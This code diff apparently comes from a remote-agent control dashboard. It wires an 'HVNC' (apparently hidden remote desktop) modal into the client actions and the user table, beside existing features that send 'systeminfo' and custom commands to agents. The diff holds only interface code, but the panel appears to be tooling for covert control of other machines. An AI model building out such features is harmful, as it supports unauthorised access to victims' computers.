@@ -5,6 +5,7 @@ import UnifiedTerminal from '../components/UnifiedTerminal';
 import TaskScheduler from '../components/TaskScheduler';
 import Settings from '../components/Settings';
 import AgentSection from '../components/AgentSection';
+import HvncModal from '../components/HvncModal';
 import LogsPage from './LogsPage';
 import AIInsightsPanel from '../components/AIInsightsPanel';
 import ClientCard from '../components/ClientCard';
@@ -71,6 +72,8 @@ const DashboardPage: React.FC<DashboardPageProps> = ({
   });
   const [showOfflineClients, setShowOfflineClients] = useState(false);
   const [selectedTerminalAgent, setSelectedTerminalAgent] = useState<Agent | null>(null);
+  const [isHvncOpen, setIsHvncOpen] = useState(false);
+  const [hvncAgent, setHvncAgent] = useState<Agent | null>(null);
 
   // Profile management state
   const [isProfileOpen, setIsProfileOpen] = useState(false);
@@ -177,6 +180,10 @@ const DashboardPage: React.FC<DashboardPageProps> = ({
       case 'system-info':
         onSendCommand(client.id, 'systeminfo', `systeminfo_${Date.now()}`);
         break;
+        case 'hvnc':
+          setHvncAgent(client);
+          setIsHvncOpen(true);
+          break;
       case 'custom-command':
         // This would open a modal for custom command input
         const command = prompt('Enter custom command:');
@@ -472,11 +479,15 @@ const DashboardPage: React.FC<DashboardPageProps> = ({
                   <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary"></div>
                 </div>
               ) : (
-                <UserTable 
-                  users={tableData} 
-                  onViewUser={onActionClicked}
-                  onViewTasks={onTasksClicked} 
-                />
+                  <UserTable
+                    users={tableData}
+                    onViewUser={onActionClicked}
+                    onViewTasks={onTasksClicked}
+                    onOpenHvnc={(agent) => {
+                      setHvncAgent(agent);
+                      setIsHvncOpen(true);
+                    }}
+                  />
               )}
             </div>
           </div>
@@ -701,6 +712,15 @@ const DashboardPage: React.FC<DashboardPageProps> = ({
       <div className="px-6 pb-8">
         {renderTabContent()}
       </div>
+
+      <HvncModal
+        isOpen={isHvncOpen}
+        agent={hvncAgent}
+        onClose={() => {
+          setIsHvncOpen(false);
+          setHvncAgent(null);
+        }}
+      />
 
       {/* Profile Modal */}
       {showProfileModal && (
